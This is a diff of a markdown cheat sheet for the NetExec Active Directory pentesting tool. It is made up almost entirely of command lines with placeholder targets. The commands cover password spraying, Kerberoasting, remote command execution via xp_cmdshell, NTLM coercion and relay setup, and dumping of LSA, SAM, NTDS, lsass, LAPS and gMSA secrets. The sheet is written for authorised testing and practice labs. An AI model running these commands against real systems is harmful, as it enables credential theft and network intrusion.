@@ -1,220 +1,290 @@
-# NetExec and CrackMapExec Cheat Sheet
-A cheat sheet for NetExec and CrackMapExec, featuring useful commands and modules for different services to use during Pentesting
+# NetExec Cheatsheet
+A cheatsheet for NetExec, featuring useful commands and modules for different services.<br>
 
-- NetExec: https://github.com/Pennyw0rth/NetExec
-- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec (no longer maintained)
-- Installation: https://www.netexec.wiki/getting-started/installation
+You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)
 
-## Table of Contents
-- [Enumeration](#enumeration)
-- [Spraying](#spraying)
-- [SMB](#smb)
-- [FTP](#ftp)
-- [LDAP](#ldap)
-- [MSSQL](#mssql)
-- [Secrets Dump](#secrets-dump)
-- [Asreproast](#asreproast)
-- [Bloodhound](#bloodhound)
-- [Useful Modules](#useful-modules)
-- [Resources](#resources)
 
-# Enumeration
-## Initial Enumeration
-```bash
-netexec smb target
+- **NetExec:** https://github.com/Pennyw0rth/NetExec
+- **Wiki:** https://www.netexec.wiki
+
+## **Table of Contents**  
+1. [Installation](#installation)
+2. [Basic Usage](#basic-usage)
+3. [Authentication](#authentication)
+   - [Null Authentication](#null-authentication)
+   - [Guest Authentication](#guest-authentication)
+   - [Local Authentication](#local-authentication)
+   - [Kerberos Authentication](#kerberos-authentication)
+   - [SMB Signing](#smb-signing)
+4. [Enumeration](#enumeration)
+   - [Basic Enumeration](#basic-enumeration)
+   - [List Shares](#list-shares)
+   - [List Usernames](#list-usernames)
+   - [Spraying](#spraying)
+5. [Service-Specific](#service-specific)
+   - [SMB](#smb)
+     - [All-in-One](#all-in-one)
+     - [Extracting Files](#extracting-files)
+     - [Spider_plus Module](#spider_plus-module)
+   - [LDAP](#ldap)
+     - [User Enumeration](#user-enumeration)
+     - [All-in-One](#all-in-one)
+     - [Kerberoasting & ASREProast](#kerberoasting--asreproast)
+     - [BloodHound](#bloodhound)
+     - [LDAP signing](#ldap-signing)
+     - [ADCS Enumeration](#adcs-enumeration)
+     - [MachineAccountQuota](#machineaccountquota)
+     - [Pre-Created Computer Accounts](#pre-created-computer-accounts)
+     - [Find Misconfigured Delegation](#find-misconfigured-delegation)
+   - [MSSQL](#mssql)
+     - [Authentication](#authentication)
+     - [Executing Commands via xp_cmdshell](#executing-commands-via-xp_cmdshell)
+     - [Extracting Files](#extracting-files)
+   - [FTP](#ftp)
+     - [List Files & Directories](#list-files--directories)
+     - [Retrieve a File](#retrieve-a-file)
+6. [Credential Dumping](#credential-dumping)
+   - [Secrets Dump](#secrets-dump)
+   - [NTDS](#ntds)
+   - [DPAPI](#dpapi)
+   - [lsass](#lsass)
+   - [LAPS](#laps)
+   - [gMSA](#gmsa)
+   - [Group Policy Preferences](#group-policy-preferences)
+   - [Retrieve MSOL account password](#retrieve-msol-account-password)
+7. [Vulnerabilities](#vulnerabilities)
+8. [Useful Modules](#useful-modules)
+   - [Webdav](#webdav)
+   - [Veeam](#veeam)
+   - [slinky](#slinky)
+   - [coerce_plus](#coerce_plus)
+   - [enum_av](#enum_av)
+9. [Resources](#resources)
+10. [Practice](#practice)
+
+## **Installation**  
 ```
-## Null Authentication
-```bash
+sudo apt install pipx git
+pipx ensurepath
+pipx install git+https://github.com/Pennyw0rth/NetExec
+```
+```
+netexec --version
+1.3.0 - NeedForSpeed - a5ec90e4
+```
+## **Basic Usage**  
+```
+netexec <service> <target> -u <username> -p <password>
+```
+Example for SMB:  
+```
+netexec smb target -u username -p password
+```
+## **Authentication**  
+### **Null Authentication**  
+```
 netexec smb target -u '' -p ''
 ```
-## Guest Authentication
-```bash
+### **Guest Authentication**  
+```
 netexec smb target -u 'guest' -p ''
 ```
-## List Shares
-```bash
-netexec smb target -u '' -p '' --shares
+### **Local Authentication**  
 ```
-```bash
-netexec smb target -u username -p password --shares
-```
-## List Usernames
-```bash
-netexec smb target -u '' -p '' --users
-```
-```bash
-netexec smb target -u '' -p '' --rid-brute
-```
-```bash
-netexec smb target -u username -p password --users
-```
-## Local Authentication
-```bash
 netexec smb target -u username -p password --local-auth
 ```
-## Using Kerberos
-```bash
+### **Kerberos Authentication**  
+```
 netexec smb target -u username -p password -k
 ```
-## Check for hosts that have SMB signing disabled
-```bash
+```
+netexec ldap target --use-kcache
+```
+### **SMB Signing**  
+```
 netexec smb target(s) --gen-relay-list relay.txt
 ```
-# Spraying
-## Password Spray
-```bash
-netexec smb target -u users.txt -p password --continue-on-success
+## **Enumeration**  
+### **Basic Enumeration**  
 ```
-```bash
+netexec smb target
+```
+### **List Shares**  
+```
+netexec smb target -u '' -p '' --shares
+netexec smb target -u username -p password --shares
+```
+### **List Usernames**  
+```
+netexec smb target -u '' -p '' --users
+netexec smb target -u '' -p '' --rid-brute
+netexec smb target -u username -p password --users
+```
+### **Spraying**   
+```
+netexec smb target -u users.txt -p password --continue-on-success
 netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
 ```
-```bash
+```
 netexec ssh target -u username -p password --continue-on-success
 ```
-# SMB
-## All In One
-```bash
+## **Service-Specific**  
+### **SMB**  
+#### **All-in-One**  
+```
 netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
 ```
-## Spider_plus Module
-```bash
-netexec smb target -u username -p password -M spider_plus
+#### **Extracting Files**  
 ```
-```bash
-netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
-```
-## Dump a specific file
-```bash
 netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
 ```
-# FTP
-## List folders and files
-```bash
-netexec ftp target -u username -p password --ls
+#### **Spider_plus Module**  
 ```
-## List files inside a folder
-```bash
-netexec ftp target -u username -p password --ls folder_name
+netexec smb target -u username -p password -M spider_plus
+netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
 ```
-## Retrieve a specific file
-```bash
-netexec ftp target -u username -p password --ls folder_name --get file_name
+### **LDAP**  
+#### **User Enumeration**  
 ```
-# LDAP
-## Enumerate users using ldap
-```bash
 netexec ldap target -u '' -p '' --users
 ```
-## All In One
-```bash
-netexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
+#### **All-in-One**  
 ```
-## Kerberoast
-```bash
-netexec ldap target -u username -p password --kerberoasting kerb.txt
+netexec ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups
 ```
-## ASREProast
-```bash
-netexec ldap target -u username -p password --asreproast asrep.txt
+#### **Kerberoasting & ASREProast**  
 ```
-# MSSQL
-## Authentication
-```bash
-netexec mssql target -u username -p password
+netexec ldap target -u username -p password --kerberoasting hash.txt
+netexec ldap target -u username -p password --asreproast hash.txt
 ```
-## Execute commands using `xp_cmdshell`
-> -X for powershell and -x for cmd
-```bash
-netexec mssql target -u username -p password -x command_to_execute
+#### **BloodHound**  
 ```
-## Get a file
-```bash
-netexec mssql target -u username -p password --get-file output_file target_file
+netexec ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all
 ```
-# Secrets Dump
-## Dump LSA secrets
-```bash
-netexec smb target -u username -p password --local-auth --lsa
-```
-## gMSA
-```bash
-netexec ldap target -u username -p password --gmsa-convert-id id
-```
-```bash
-netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
-```
-## Group Policy Preferences
-```bash
-netexec smb target -u username -p password -M gpp_password
-```
-## Dump LAPS v1 and v2 password
-```bash
-netexec smb target -u username -p password --laps
-```
-## Dump dpapi credentials
-```bash
-netexec smb target -u username -p password --laps --dpapi
-```
-## Dump NTDS.dit
-```bash
-netexec smb target -u username -p password --ntds
-```
-# Bloodhound
-```bash
-nxc ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all
-```
-# Useful Modules
-## Webdav
-Checks whether the WebClient service is running on the target
-```bash
-netexec smb ip -u username -p password -M webdav 
-```
-## Veeam
-Extracts credentials from local Veeam SQL Database
-```bash
-netexec smb target -u username -p password -M veeam
-```
-## slinky
-Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
-```bash
-netexec smb ip -u username -p password -M slinky 
-```
-## ntdsutil
-Dump NTDS with ntdsutil
-```bash
-netexec smb ip -u username -p password -M ntdsutil 
-```
-## ldap-checker
+#### **LDAP signing**
 Checks whether LDAP signing and binding are required and/or enforced
-```bash
-cme ldap target -u username -p password -M ldap-checker
 ```
-## Check if the DC is vulnerable to zerologon, petitpotam, nopac
-```bash
-netexec smb target -u username -p password -M zerologon
+netexec ldap target -u username -p password -M ldap-checker
 ```
-```bash
-netexec smb target -u username -p password -M petitpotam
+#### **ADCS Enumeration**
 ```
-```bash
-netexec smb target -u username -p password -M nopac
-```
-## Check the MachineAccountQuota
-```bash
-netexec ldap target -u username -p password -M maq
-```
-## ADCS Enumeration
-```bash
 netexec ldap target -u username -p password -M adcs
 ```
-## Dump lsass
-```bash
+#### **MachineAccountQuota**
+```
+netexec ldap target -u username -p password -M maq
+```
+#### **Pre-Created Computer Accounts**
+```
+netexec ldap target -u username -p password -M pre2k
+```
+#### **Find Misconfigured Delegation**
+```
+nxc ldap target -u username -p password --find-delegation
+```
+### **MSSQL**  
+#### **Authentication**  
+```
+netexec mssql target -u username -p password
+```
+#### **Executing Commands via xp_cmdshell**  
+```
+netexec mssql target -u username -p password -x command_to_execute
+```
+#### **Extracting Files**  
+```
+netexec mssql target -u username -p password --get-file output_file target_file
+```
+### **FTP**  
+#### **List Files & Directories**  
+```
+netexec ftp target -u username -p password --ls
+netexec ftp target -u username -p password --ls folder_name
+```
+#### **Retrieve a File**  
+```
+netexec ftp target -u username -p password --ls folder_name --get file_name
+```
+## **Credential Dumping**  
+### **Secrets Dump**  
+```
+netexec smb target -u username -p password --lsa
+netexec smb target -u username -p password --sam
+```
+### **NTDS**  
+```
+netexec smb target -u username -p password --ntds
+netexec smb target -u username -p password -M ntdsutil
+```
+### **DPAPI**
+```
+netexec smb target -u username -p password --dpapi
+```
+### **lsass**  
+```
 netexec smb target -u username -p password -M lsassy
 ```
-## Retrieve MSOL account password
-```bash
+### **LAPS**  
+```
+netexec smb target -u username -p password --laps
+```
+### **gMSA**
+```
+netexec ldap target -u username -p password --gmsa
+netexec ldap target -u username -p password --gmsa-convert-id id
+netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
+```
+### **Group Policy Preferences**
+```
+netexec smb target -u username -p password -M gpp_password
+```
+### **Retrieve MSOL account password**
+```
 netexec smb target -u username -p password -M msol
 ```
-# Resources
+## **Vulnerabilities**
+Check if the DC is vulnerable to zerologon, petitpotam, nopac
+```
+netexec smb target -u username -p password -M zerologon
+netexec smb target -u username -p password -M petitpotam
+netexec smb target -u username -p password -M nopac
+```
+## Useful Modules
+### **Webdav**
+Checks whether the WebClient service is running on the target
+```
+netexec smb target -u username -p password -M webdav 
+```
+### **Veeam**
+Extracts credentials from local Veeam SQL Database
+```
+netexec smb target -u username -p password -M veeam
+```
+### **slinky**
+Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
+```
+netexec smb target -u username -p password -M slinky 
+```
+### **coerce_plus**
+Check if the Target is vulnerable to any coerce vulns (PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug)
+```
+netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip
+```
+### **enum_av**
+Gathers information on all endpoint protection solutions installed on the the remote host
+```
+netexec smb target -u username -p password -M enum_av
+```
+## Resources
 - https://www.netexec.wiki/
 - https://www.rayanle.cat/lehack-2024-netexec-workshop-writeup/
+
+## Practice
+- Mist (HackTheBox)
+- Rebound (HackTheBox)
+- Vintage (HackTheBox)
+- Cicada (HackTheBox)
+- Baby (Vulnlab)
+- Intercept (Vulnlab)
+- Reflection (Vulnlab)
+- NetExec Lab (https://github.com/Pennyw0rth/NetExec-Lab)
